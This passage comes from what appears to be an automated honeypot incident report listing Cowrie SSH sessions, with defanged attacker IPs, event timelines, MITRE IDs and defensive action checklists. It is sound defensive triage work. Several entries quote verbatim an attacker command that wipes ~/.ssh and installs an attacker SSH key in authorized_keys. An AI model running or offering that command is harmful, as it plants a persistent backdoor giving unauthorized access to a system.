- [ ] Submit `172.173.117[.]246` to AbuseIPDB if not already reported
- [ ] Block `172.173.117[.]246` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-80434405100b

| Field | Detail |
|---|---|
| **Source IP** | `172.173.117[.]246` |
| **First Seen** | 2026-03-20 09:13 |
| **Last Seen** | 2026-03-20 09:13 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-20 09:13:22` | `cowrie.session.connect` |
| `2026-03-20 09:13:22` | `cowrie.client.version` |
| `2026-03-20 09:13:22` | `cowrie.client.kex` |
| `2026-03-20 09:13:23` | `cowrie.login.success` |
| `2026-03-20 09:13:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.173.117[.]246` to AbuseIPDB if not already reported
- [ ] Block `172.173.117[.]246` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-30e2ce6c477d

| Field | Detail |
|---|---|
| **Source IP** | `101.36.109[.]176` |
| **First Seen** | 2026-03-20 09:36 |
| **Last Seen** | 2026-03-20 09:36 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-20 09:36:20` | `cowrie.session.connect` |
| `2026-03-20 09:36:20` | `cowrie.client.version` |
| `2026-03-20 09:36:20` | `cowrie.client.kex` |
| `2026-03-20 09:36:20` | `cowrie.login.success` |
| `2026-03-20 09:36:20` | `cowrie.session.params` |
| `2026-03-20 09:36:20` | `cowrie.command.input` |
| `2026-03-20 09:36:20` | `cowrie.command.failed` |
| `2026-03-20 09:36:20` | `cowrie.log.closed` |
| `2026-03-20 09:36:21` | `cowrie.session.params` |
| `2026-03-20 09:36:21` | `cowrie.command.input` |
| `2026-03-20 09:36:21` | `cowrie.session.file_download` |
| `2026-03-20 09:36:21` | `cowrie.log.closed` |
| `2026-03-20 09:36:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.109[.]176` to AbuseIPDB if not already reported
- [ ] Block `101.36.109[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ab7c1b498a63

| Field | Detail |
|---|---|
| **Source IP** | `101.36.109[.]176` |
| **First Seen** | 2026-03-20 09:36 |
| **Last Seen** | 2026-03-20 09:36 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-20 09:36:23` | `cowrie.session.connect` |
| `2026-03-20 09:36:23` | `cowrie.client.version` |
| `2026-03-20 09:36:23` | `cowrie.client.kex` |
| `2026-03-20 09:36:23` | `cowrie.login.success` |
| `2026-03-20 09:36:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.109[.]176` to AbuseIPDB if not already reported
- [ ] Block `101.36.109[.]176` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4c93c82f64b8

| Field | Detail |
|---|---|
| **Source IP** | `101.36.106[.]113` |
| **First Seen** | 2026-03-20 10:38 |
| **Last Seen** | 2026-03-20 10:38 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-20 10:38:00` | `cowrie.session.connect` |
| `2026-03-20 10:38:00` | `cowrie.client.version` |
| `2026-03-20 10:38:00` | `cowrie.client.kex` |
| `2026-03-20 10:38:01` | `cowrie.login.success` |
| `2026-03-20 10:38:01` | `cowrie.session.params` |
| `2026-03-20 10:38:01` | `cowrie.command.input` |
| `2026-03-20 10:38:01` | `cowrie.command.failed` |
| `2026-03-20 10:38:01` | `cowrie.log.closed` |
| `2026-03-20 10:38:01` | `cowrie.session.params` |
| `2026-03-20 10:38:01` | `cowrie.command.input` |
| `2026-03-20 10:38:01` | `cowrie.session.file_download` |
| `2026-03-20 10:38:01` | `cowrie.log.closed` |
| `2026-03-20 10:38:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.106[.]113` to AbuseIPDB if not already reported
- [ ] Block `101.36.106[.]113` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-228e36b5d403

| Field | Detail |
|---|---|
| **Source IP** | `101.36.106[.]113` |
| **First Seen** | 2026-03-20 10:38 |
| **Last Seen** | 2026-03-20 10:38 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-20 10:38:03` | `cowrie.session.connect` |
| `2026-03-20 10:38:03` | `cowrie.client.version` |
| `2026-03-20 10:38:03` | `cowrie.client.kex` |
| `2026-03-20 10:38:04` | `cowrie.login.success` |
| `2026-03-20 10:38:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.106[.]113` to AbuseIPDB if not already reported
- [ ] Block `101.36.106[.]113` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c019547919c2

| Field | Detail |
|---|---|
| **Source IP** | `106.13.85[.]199` |
| **First Seen** | 2026-03-20 10:48 |
| **Last Seen** | 2026-03-20 10:48 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-20 10:48:06` | `cowrie.session.connect` |
| `2026-03-20 10:48:06` | `cowrie.client.version` |
| `2026-03-20 10:48:12` | `cowrie.client.kex` |
| `2026-03-20 10:48:13` | `cowrie.login.success` |
| `2026-03-20 10:48:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `106.13.85[.]199` to AbuseIPDB if not already reported
- [ ] Block `106.13.85[.]199` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4ef23981f010

| Field | Detail |
|---|---|
| **Source IP** | `219.128.15[.]190` |
| **First Seen** | 2026-03-20 10:53 |
| **Last Seen** | 2026-03-20 10:53 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-20 10:53:32` | `cowrie.session.connect` |
| `2026-03-20 10:53:33` | `cowrie.client.version` |
| `2026-03-20 10:53:33` | `cowrie.client.kex` |
| `2026-03-20 10:53:35` | `cowrie.login.success` |
| `2026-03-20 10:53:36` | `cowrie.direct-tcpip.request` |
| `2026-03-20 10:53:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `219.128.15[.]190` to AbuseIPDB if not already reported
- [ ] Block `219.128.15[.]190` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dda0c49ee57f

| Field | Detail |
|---|---|
| **Source IP** | `118.45.101[.]159` |
| **First Seen** | 2026-03-20 12:46 |
| **Last Seen** | 2026-03-20 12:46 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-20 12:46:50` | `cowrie.session.connect` |
| `2026-03-20 12:46:51` | `cowrie.client.version` |
| `2026-03-20 12:46:51` | `cowrie.client.kex` |
| `2026-03-20 12:46:52` | `cowrie.login.success` |
| `2026-03-20 12:46:53` | `cowrie.direct-tcpip.request` |
| `2026-03-20 12:46:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.45.101[.]159` to AbuseIPDB if not already reported
- [ ] Block `118.45.101[.]159` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-165e3d04a0e5

| Field | Detail |
|---|---|
| **Source IP** | `115.244.235[.]242` |
| **First Seen** | 2026-03-20 12:47 |
| **Last Seen** | 2026-03-20 12:47 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-20 12:47:02` | `cowrie.session.connect` |
| `2026-03-20 12:47:03` | `cowrie.client.version` |
| `2026-03-20 12:47:03` | `cowrie.client.kex` |
| `2026-03-20 12:47:04` | `cowrie.login.success` |
| `2026-03-20 12:47:04` | `cowrie.direct-tcpip.request` |
| `2026-03-20 12:47:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `115.244.235[.]242` to AbuseIPDB if not already reported
- [ ] Block `115.244.235[.]242` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2b29360f09bd

| Field | Detail |
|---|---|
| **Source IP** | `197.211.55[.]20` |
| **First Seen** | 2026-03-20 12:53 |
| **Last Seen** | 2026-03-20 12:53 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-20 12:53:52` | `cowrie.session.connect` |
| `2026-03-20 12:53:52` | `cowrie.client.version` |
| `2026-03-20 12:53:53` | `cowrie.client.kex` |
| `2026-03-20 12:53:54` | `cowrie.login.success` |
| `2026-03-20 12:53:54` | `cowrie.session.params` |
| `2026-03-20 12:53:54` | `cowrie.command.input` |
| `2026-03-20 12:53:54` | `cowrie.command.failed` |
| `2026-03-20 12:53:54` | `cowrie.log.closed` |
| `2026-03-20 12:53:55` | `cowrie.session.params` |
| `2026-03-20 12:53:55` | `cowrie.command.input` |
| `2026-03-20 12:53:55` | `cowrie.session.file_download` |
| `2026-03-20 12:53:55` | `cowrie.log.closed` |
| `2026-03-20 12:53:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.211.55[.]20` to AbuseIPDB if not already reported
- [ ] Block `197.211.55[.]20` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1cd320f134c8

| Field | Detail |
|---|---|
| **Source IP** | `197.211.55[.]20` |
| **First Seen** | 2026-03-20 12:53 |
| **Last Seen** | 2026-03-20 12:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-20 12:53:58` | `cowrie.session.connect` |
| `2026-03-20 12:53:58` | `cowrie.client.version` |
| `2026-03-20 12:53:58` | `cowrie.client.kex` |
| `2026-03-20 12:53:59` | `cowrie.login.success` |
| `2026-03-20 12:53:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.211.55[.]20` to AbuseIPDB if not already reported
- [ ] Block `197.211.55[.]20` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0ede72c2dd82

| Field | Detail |
|---|---|
| **Source IP** | `218.29.196[.]162` |
| **First Seen** | 2026-03-20 14:48 |
| **Last Seen** | 2026-03-20 14:48 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-20 14:48:08` | `cowrie.session.connect` |
| `2026-03-20 14:48:09` | `cowrie.client.version` |
| `2026-03-20 14:48:09` | `cowrie.client.kex` |
| `2026-03-20 14:48:11` | `cowrie.login.success` |
| `2026-03-20 14:48:12` | `cowrie.direct-tcpip.request` |
| `2026-03-20 14:48:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `218.29.196[.]162` to AbuseIPDB if not already reported
- [ ] Block `218.29.196[.]162` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8b98d44831f1

| Field | Detail |
|---|---|
| **Source IP** | `59.126.224[.]134` |
| **First Seen** | 2026-03-20 15:15 |
| **Last Seen** | 2026-03-20 15:15 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-20 15:15:18` | `cowrie.session.connect` |
| `2026-03-20 15:15:18` | `cowrie.client.version` |
| `2026-03-20 15:15:18` | `cowrie.client.kex` |
| `2026-03-20 15:15:19` | `cowrie.login.success` |
| `2026-03-20 15:15:19` | `cowrie.session.params` |
| `2026-03-20 15:15:19` | `cowrie.command.input` |
| `2026-03-20 15:15:19` | `cowrie.command.failed` |
| `2026-03-20 15:15:19` | `cowrie.log.closed` |
| `2026-03-20 15:15:20` | `cowrie.session.params` |
| `2026-03-20 15:15:20` | `cowrie.command.input` |
| `2026-03-20 15:15:20` | `cowrie.session.file_download` |
| `2026-03-20 15:15:20` | `cowrie.log.closed` |
| `2026-03-20 15:15:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `59.126.224[.]134` to AbuseIPDB if not already reported
- [ ] Block `59.126.224[.]134` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-451f8b886c6d

| Field | Detail |
|---|---|
| **Source IP** | `59.126.224[.]134` |
| **First Seen** | 2026-03-20 15:15 |
| **Last Seen** | 2026-03-20 15:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-20 15:15:22` | `cowrie.session.connect` |
| `2026-03-20 15:15:22` | `cowrie.client.version` |
| `2026-03-20 15:15:22` | `cowrie.client.kex` |
| `2026-03-20 15:15:23` | `cowrie.login.success` |
| `2026-03-20 15:15:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `59.126.224[.]134` to AbuseIPDB if not already reported
- [ ] Block `59.126.224[.]134` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c1e348205cf5

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]80` |
| **First Seen** | 2026-03-20 15:16 |
| **Last Seen** | 2026-03-20 15:17 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-20 15:16:57` | `cowrie.session.connect` |
| `2026-03-20 15:16:57` | `cowrie.client.version` |
| `2026-03-20 15:16:58` | `cowrie.client.kex` |
| `2026-03-20 15:16:59` | `cowrie.login.success` |
| `2026-03-20 15:17:00` | `cowrie.session.params` |
| `2026-03-20 15:17:00` | `cowrie.command.input` |
| `2026-03-20 15:17:00` | `cowrie.command.failed` |
| `2026-03-20 15:17:00` | `cowrie.log.closed` |
| `2026-03-20 15:17:01` | `cowrie.session.params` |
| `2026-03-20 15:17:01` | `cowrie.command.input` |
| `2026-03-20 15:17:01` | `cowrie.session.file_download` |
| `2026-03-20 15:17:01` | `cowrie.log.closed` |
| `2026-03-20 15:17:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]80` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]80` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-24d863bd6a4b

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]80` |
| **First Seen** | 2026-03-20 15:17 |
| **Last Seen** | 2026-03-20 15:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-20 15:17:04` | `cowrie.session.connect` |
| `2026-03-20 15:17:04` | `cowrie.client.version` |
| `2026-03-20 15:17:05` | `cowrie.client.kex` |
| `2026-03-20 15:17:06` | `cowrie.login.success` |
| `2026-03-20 15:17:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]80` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]80` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ea58dcdf5700

| Field | Detail |
|---|---|
| **Source IP** | `120.62.8[.]17` |
| **First Seen** | 2026-03-20 15:21 |
| **Last Seen** | 2026-03-20 15:21 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-20 15:21:55` | `cowrie.session.connect` |
| `2026-03-20 15:21:55` | `cowrie.client.version` |
| `2026-03-20 15:21:55` | `cowrie.client.kex` |
| `2026-03-20 15:21:55` | `cowrie.login.success` |
| `2026-03-20 15:21:55` | `cowrie.session.params` |
| `2026-03-20 15:21:55` | `cowrie.command.input` |
| `2026-03-20 15:21:55` | `cowrie.command.failed` |
| `2026-03-20 15:21:55` | `cowrie.log.closed` |
| `2026-03-20 15:21:55` | `cowrie.session.params` |
| `2026-03-20 15:21:55` | `cowrie.command.input` |
| `2026-03-20 15:21:55` | `cowrie.session.file_download` |
| `2026-03-20 15:21:55` | `cowrie.log.closed` |
| `2026-03-20 15:21:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.62.8[.]17` to AbuseIPDB if not already reported
- [ ] Block `120.62.8[.]17` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1d8c9757768c

| Field | Detail |
|---|---|
| **Source IP** | `120.62.8[.]17` |
| **First Seen** | 2026-03-20 15:21 |
| **Last Seen** | 2026-03-20 15:21 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-20 15:21:56` | `cowrie.session.connect` |
| `2026-03-20 15:21:56` | `cowrie.client.version` |
| `2026-03-20 15:21:56` | `cowrie.client.kex` |
| `2026-03-20 15:21:56` | `cowrie.login.success` |
| `2026-03-20 15:21:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.62.8[.]17` to AbuseIPDB if not already reported
- [ ] Block `120.62.8[.]17` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a74f0abaa140

| Field | Detail |
|---|---|
| **Source IP** | `120.62.8[.]17` |
| **First Seen** | 2026-03-20 15:23 |
| **Last Seen** | 2026-03-20 15:23 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-20 15:23:51` | `cowrie.session.connect` |
| `2026-03-20 15:23:51` | `cowrie.client.version` |
| `2026-03-20 15:23:51` | `cowrie.client.kex` |
| `2026-03-20 15:23:51` | `cowrie.login.success` |
| `2026-03-20 15:23:51` | `cowrie.session.params` |
| `2026-03-20 15:23:51` | `cowrie.command.input` |
